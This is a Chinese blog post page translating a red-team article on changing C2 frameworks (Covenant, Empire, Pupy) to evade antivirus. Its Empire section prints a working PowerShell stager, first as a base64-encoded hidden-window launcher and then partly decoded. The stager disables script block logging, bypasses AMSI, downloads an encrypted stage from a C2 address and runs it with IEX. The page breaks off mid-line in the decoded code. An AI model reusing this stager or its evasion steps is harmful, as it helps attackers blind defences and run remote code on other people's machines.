<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>自定义 C2-Frameworks 来逃避 AV 检测 | zeronohacker</title><meta name="keywords" content="C2,PowerShell,Pupy"><meta name="author" content="zeronohacker"><meta name="copyright" content="zeronohacker"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本篇文章翻译自：Customizing C2-Frameworks for AV-Evasion  这篇文章将会给大家阐述如何通过修改后的 Command &amp; Control (C2) Frameworks 来逃避 AV 检测。 介绍在过去的几周，我参与了 红队队员的培训课程，在课程当中使用了基于 C2-Framework 的 Covenant，我从中获取到了一些经验。当开始学习这门课程"><meta property="og:type" content="article"><meta property="og:title" content="自定义 C2-Frameworks 来逃避 AV 检测"><meta property="og:url" content="https://zeronohacker.github.io/2020/11/23/customizing-c2-frameworks-for-av-evasion/index.html"><meta property="og:site_name" content="zeronohacker"><meta property="og:description" content="本篇文章翻译自：Customizing C2-Frameworks for AV-Evasion  这篇文章将会给大家阐述如何通过修改后的 Command &amp; Control (C2) Frameworks 来逃避 AV 检测。 介绍在过去的几周，我参与了 红队队员的培训课程，在课程当中使用了基于 C2-Framework 的 Covenant，我从中获取到了一些经验。当开始学习这门课程"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://image.zeronohacker.com/top_img/2020/11/23/malware-img-66.jpg"><meta property="article:published_time" content="2020-11-23T12:45:19.000Z"><meta property="article:modified_time" content="2021-09-20T13:18:19.213Z"><meta property="article:author" content="zeronohacker"><meta property="article:tag" content="PowerShell"><meta property="article:tag" content="C2"><meta property="article:tag" content="Pupy"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://image.zeronohacker.com/top_img/2020/11/23/malware-img-66.jpg"><link rel="shortcut icon" href="https://image.zeronohacker.com/favicon.png"><link rel="canonical" href="https://zeronohacker.github.io/2020/11/23/customizing-c2-frameworks-for-av-evasion/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#121212",position:"bottom-left"},source:{jQuery:"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js",justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css"},fancybox:{js:"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js",css:"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"}},isPhotoFigcaption:!0,islazyload:!1,isanchor:!1}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"自定义 C2-Frameworks 来逃避 AV 检测",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2021-09-20 21:18:19"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)}),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme");"dark"===t?activateDarkMode():"light"===t&&activateLightMode();const o=saveToLocal.get("aside-status");void 0!==o&&("hide"===o?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));GLOBAL_CONFIG_SITE.isHome&&/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.min.css" media="defer" onload='this.media="all"'><script async src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="zeronohacker" type="application/atom+xml"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://image.zeronohacker.com/header.png" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://image.zeronohacker.com/top_img/2020/11/23/malware-img-66.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zeronohacker</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">自定义 C2-Frameworks 来逃避 AV 检测</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2020-11-23T12:45:19.000Z" title="undefined 2020-11-23 20:45:19">2020-11-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="自定义 C2-Frameworks 来逃避 AV 检测"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2020/11/23/customizing-c2-frameworks-for-av-evasion/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2020/11/23/customizing-c2-frameworks-for-av-evasion/" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote><p>本篇文章翻译自：<a target="_blank" rel="noopener" href="https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/">Customizing C2-Frameworks for AV-Evasion</a></p></blockquote><p>这篇文章将会给大家阐述如何通过修改后的 Command &amp; Control (C2) Frameworks 来逃避 AV 检测。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在过去的几周，我参与了 <a target="_blank" rel="noopener" href="https://www.zeropointsecurity.co.uk/red-team-ops">红队队员的培训课程</a>，在课程当中使用了基于 C2-Framework 的 Covenant，我从中获取到了一些经验。当开始学习这门课程时，并没有关于逃避 AV 检测和 C2-Customization 的说明，所以自己用 <a target="_blank" rel="noopener" href="https://github.com/cobbr/Covenant">Covenant</a> 做了关于这方面的内容，同时增加了 逃避 AV 检测，Rastamouse <a target="_blank" rel="noopener" href="https://offensivedefence.co.uk/posts/covenant-profiles-templates/">在此</a> 发布了关于此内容的一部分。</p><div class="tip"><p>提示：Covenant 是一个具有攻击性的 .NET 命令和控制框架，可充当为红队队员协作命令和控制平台。</p></div><p>在这篇博客文章中，我将介绍如何通过更改 C2-Frameworks 源代码的方法来逃避 AV 检测。应当明确的是，由于我的方法是公开的，因此我的方法将在不久的将来会 <strong>get flagged</strong>，因此，我建议在这之后再创建你自己的项目。</p><p><strong>注：关于 get flagged 的说明 -&gt; <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av712735770/">https://www.bilibili.com/video/av712735770/</a></strong></p><p>第一部分将介绍 Powershell <a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Empire">Empire</a>，这是我在从事安全职业生涯中第一次接触 C2-Frameworks。</p><div class="tip"><p>提示：Empire 3 是一个后来开发的框架，因为它是之前的 PowerShell Empire 和 Python EmPyre 项目的合并，包括纯 PowerShell Windows 代理，并与 Python 3.x Linux/OS X 代理兼容。该框架提供了密码安全的通信和灵活的结构。</p></div><p>第二部分将介绍 <a target="_blank" rel="noopener" href="https://github.com/n1nj4sec/pupy">Pupy</a>，它具有一些非常独特的模块和特性。</p><div class="tip"><p>提示：Pupy 主要是使用 Python 编写的跨平台，多功能 RAT 工具。它具有全内存执行准则，并且占用空间极小。Pupy 可以使用多种传输方式进行通信，可以使用反射注入到进程中，还可以从内存中远程加载 Python 代码，Python 包和 Python C 扩展。</p></div><p>最后，但并不是最重要的是，我将会写关于我的 Covenant 方法。</p><p>因此，让我们直接进入吧！</p><h2 id="Powershell-Empire"><a href="#Powershell-Empire" class="headerlink" title="Powershell Empire"></a>Powershell Empire</h2><p><a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY">BC-Security</a> 在 Empire 的方方面面 (更新、维护等) 做得非常出色。感觉每周都会在框架中实现新的功能和改进。 Powershell Empire 有许多好处，因此值得使用该框架。我个人认为最重要的是：</p><ul><li>有很多模块，涉及提权，横向移动，域枚举，凭证收集，持久性等等；</li><li>易于使用的 CLI，到目前为止，我还没有使用 <a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Starkiller">Starkiller</a> GUI；</li><li>非常稳定，代理可以存活，几乎很少发生崩溃；</li><li>易于修改以及可集成定制模块；</li></ul><div class="tip"><p>提示：Starkiller 是 Powershell Empire 的前端。它是用 VueJS 编写的 Electron 应用程序。</p></div><p>我认为最常用的默认 HTTP-Listener 选项如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/Listener.jpg" alt=""></p><p>如果我们保留默认选项，请设置侦听端口并启动侦听器，我们可以在 Powershell 或 Python 启动器进行选择。Python 启动器用于 linux 代理，这我不会深入探讨。具有默认选项的 Powershell 启动器如下所示：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell <span class="literal">-noP</span> <span class="literal">-sta</span> <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-enc</span> SQBmACgAJABQAFMAVgBlAHIAUwBJAG8AbgBUAEEAYgBMAEUALgBQAFMAVgBlAFIAUwBJAG8ATgAuAE0AQQBKAE8AUgAgAC0ARwBFACAAMwApAHsAJABjADMAMgAyAD0AWwByAEUAZgBdAC4AQQBzAFMARQBNAGIATABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAGMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAYwAzADIAMgAuAEcARQBUAFYAQQBMAFUAZQAoACQATgB1AEwATAApADsASQBmACgAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAYwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBBAEwAPQBbAEMAbwBsAGwAZQBDAFQASQBvAG4AUwAuAEcARQBOAGUAcgBJAGMALgBEAEkAYwB0AGkATwBOAEEAUgB5AFsAUwB0AHIASQBOAGcALABTAFkAUwB0AEUAbQAuAE8AYgBKAGUAQwBUAF0AXQA6ADoAbgBlAHcAKAApADsAJABWAEEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAEwAUwBlAHsAWwBTAEMAcgBpAFAAdABCAEwAbwBjAGsAXQAuACIARwBFAFQARgBpAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUAZQAoACQATgB1AEwAbAAsACgATgBFAHcALQBPAEIAagBFAEMAVAAgAEMATwBMAEwAZQBDAFQASQBvAG4AUwAuAEcARQBOAGUAUgBJAGMALgBIAEEAUwBIAFMAZQBUAFsAUwB0AFIAaQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBTAFMAZQBtAGIAbABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAEYALgBHAEUAdABGAGkARQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBsAHUAZQAoACQATgB1AEwAbAAsACQAdABSAHUAZQApADsAfQA7AFsAUwBZAFMAVABlAE0ALgBOAGUAVAAuAFMAZQByAHYASQBDAEUAUABvAEkATgB0AE0AYQBOAEEAZwBlAFIAXQA6ADoARQB4AFAAZQBDAHQAMQAwADAAQwBvAG4AVABpAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4ARQB3AC0ATwBCAGoARQBDAHQAIABTAHkAcwBUAGUAbQAuAE4AZQBUAC4AVwBFAEIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBPAGQAaQBOAGcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQBUAFMAVAByAEkAbgBHACgAWwBDAG8AbgB2AGUAUgB0AF0AOgA6AEYAcgBvAE0AQgBBAFMARQA2ADQAUwB0AHIASQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAawBBAE0AZwBBAHUAQQBEAEUAQQBOAGcAQQA0AEEAQwA0AEEATQBRAEEAdwBBAEQAQQBBAEwAZwBBAHgAQQBEAE0AQQBNAFEAQQA2AEEARABnAEEATQBBAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAcgBPAFgAWQA9AFsAUwB5AHMAVABlAE0ALgBOAGUAVAAuAFcARQBCAFIARQBxAHUAZQBzAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAHIATwBYAHkAOwAkADUANwA5ADMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AEkAYQBsAHMAIAA9ACAAWwBTAFkAUwB0AEUAbQAuAE4ARQB0AC4AQwBSAGUAZABFAG4AVABpAEEATABDAEEAYwBIAGUAXQA6ADoARABlAEYAQQB1AEwAdABOAGUAdAB3AG8AcgBrAEMAcgBFAEQAZQBOAFQASQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAUwB0AEUATQAuAFQAZQB4AFQALgBFAG4AQwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBTACgAJwBHAGUAWABTAFoAbwApAHQARAAyADsAfQBDACwAUgBmADkAWQBqAEoANgBWAF0AewB2AE8AZAAlAEkARQAmACgAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AVQBOAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABlAGEARABlAFIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBBAGEAcgBVAHEAagBhAFAAVwBBAFYATgA9AE8AYgBSAHMAQwAyAFYAUAB1ADAAcgBWAHIAcwAyADYASQBSACsAMAAxAGUANQBXAGsALwB3AD0AIgApADsAJABkAGEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcATgBsAE8AYQBkAEQAQQB0AGEAKAAkAFMARQBSACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQARABBAHQAYQBbADQALgAuACQAZABBAHQAYQAuAEwAZQBOAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA</span><br></pre></td></tr></table></figure><p>在安装了 AV 软件的 Windows 系统上执行此启动器很可能会导致进程阻塞和弹出 AV 消息。有以下原因之一：</p><ul><li>许多 AV 供应商都具有这么一个模块，这个模块可以阻止生成带有 <code>-noP -sta -w1 -enc</code> 参数的新 Powershell 进程 —— 脚本内容本身目前尚不完善，所有内容均被阻止；</li><li>使用 AMSI 并阻止 BASE64 编码的脚本内容；</li></ul><p><code>-noP -sta -w1 -enc</code> 参数中的 <code>-noP</code> 表示不加载当前用户的配置文件；<code>-sta</code> 表示的是使用单线程单元来启动 Powershell；<code>-w1</code> 表示的是设置会话窗口样式，此处为隐藏窗口被打开；<code>-enc</code> 表示的是允许传入一个 base64 编码过的字符串。仅使用这些参数之一就可能会阻止通过 AV 模块执行。为了绕开，对源代码修改更是于事无补。但是你可以避免使用这些参数，而是执行解码后的脚本。</p><div class="tip"><p>提示：更多参数可详见 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/de-de/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1">https://docs.microsoft.com/de-de/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1</a></p></div><p>现在，我们将使用命令 <code>echo “Base64Content” | base64</code> 对启动程序的内容进行解码。base64 -d 看看，Empire 在这里到底在做什么。base64 解码的内容看起来像这样，为了更好地了解，我用换行符替换了一些分号：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">If</span>(<span class="variable">$PSVerSIonTAbLE</span>.PSVeRSIoN.MAJOR <span class="operator">-GE</span> <span class="number">3</span>)&#123;<span class="variable">$c322</span>=[<span class="type">rEf</span>].AsSEMbLY.GetTypE(<span class="string">&#x27;System.Management.Automation.Utils&#x27;</span>).<span class="string">&quot;GEtFie`LD&quot;</span>(<span class="string">&#x27;cachedGroupPolicySettings&#x27;</span>,<span class="string">&#x27;N&#x27;</span>+<span class="string">&#x27;onPublic,Static&#x27;</span>)</span><br><span class="line"><span class="keyword">IF</span>(<span class="variable">$c322</span>)&#123;<span class="variable">$c742</span>=<span class="variable">$c322</span>.GETVALUe(<span class="variable">$NuLL</span>)</span><br><span class="line"><span class="keyword">If</span>(<span class="variable">$C742</span>[<span class="string">&#x27;ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>])&#123;<span class="variable">$c742</span>[<span class="string">&#x27;ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>][<span class="string">&#x27;EnableScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>]=<span class="number">0</span>;<span class="variable">$c742</span>[<span class="string">&#x27;ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>][<span class="string">&#x27;EnableScriptBlockInvocationLogging&#x27;</span>]=<span class="number">0</span>&#125;<span class="variable">$VAL</span>=[<span class="type">ColleCTIonS.GENerIc.DIctiONARy</span>[<span class="built_in">StrINg</span>,<span class="type">SYStEm.ObJeCT</span>]]::new()</span><br><span class="line"><span class="variable">$VAL</span>.ADd(<span class="string">&#x27;EnableScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>,<span class="number">0</span>)</span><br><span class="line"><span class="variable">$Val</span>.AdD(<span class="string">&#x27;EnableScriptBlockInvocationLogging&#x27;</span>,<span class="number">0</span>)</span><br><span class="line"><span class="variable">$c742</span>[<span class="string">&#x27;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>]=<span class="variable">$val</span>&#125;<span class="keyword">ELSe</span>&#123;[<span class="type">SCriPtBLock</span>].<span class="string">&quot;GETFie`Ld&quot;</span>(<span class="string">&#x27;signatures&#x27;</span>,<span class="string">&#x27;N&#x27;</span>+<span class="string">&#x27;onPublic,Static&#x27;</span>).SETVALUe(<span class="variable">$NuLl</span>,(<span class="built_in">NEw-OBjECT</span> COLLeCTIonS.GENeRIc.HASHSeT[<span class="built_in">StRiNg</span>]))&#125;<span class="variable">$Ref</span>=[<span class="type">REF</span>].ASSemblY.GeTTYpe(<span class="string">&#x27;System.Management.Automation.Amsi&#x27;</span>+<span class="string">&#x27;Utils&#x27;</span>)</span><br><span class="line"><span class="variable">$REF</span>.GEtFiELD(<span class="string">&#x27;amsiInitF&#x27;</span>+<span class="string">&#x27;ailed&#x27;</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>).SETVAlue(<span class="variable">$NuLl</span>,<span class="variable">$tRue</span>);&#125;</span><br><span class="line">[<span class="type">SYSTeM.NeT.ServICEPoINtMaNAgeR</span>]::ExPeCt100<span class="keyword">ConTinUE</span>=<span class="number">0</span>;<span class="variable">$5793</span>=<span class="built_in">NEw-OBjECt</span> SysTem.NeT.WEBClIeNt</span><br><span class="line"><span class="variable">$u</span>=<span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span></span><br><span class="line"><span class="variable">$ser</span>=<span class="variable">$</span>([<span class="type">TeXt.ENCOdiNg</span>]::UNicODe.GETSTrInG([<span class="type">ConveRt</span>]::FroMBASE64StrING(<span class="string">&#x27;aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgAxADMAMQA6ADgAMAA=&#x27;</span>)))</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&#x27;/login/process.php&#x27;</span>;<span class="variable">$5793</span>.HEADErs.Add(<span class="string">&#x27;User-Agent&#x27;</span>,<span class="variable">$u</span>)</span><br><span class="line"><span class="variable">$5793</span>.PrOXY=[<span class="type">SysTeM.NeT.WEBREquest</span>]::DeFaULtWEBPrOXy;<span class="variable">$5793</span>.Proxy.CredentIals = [<span 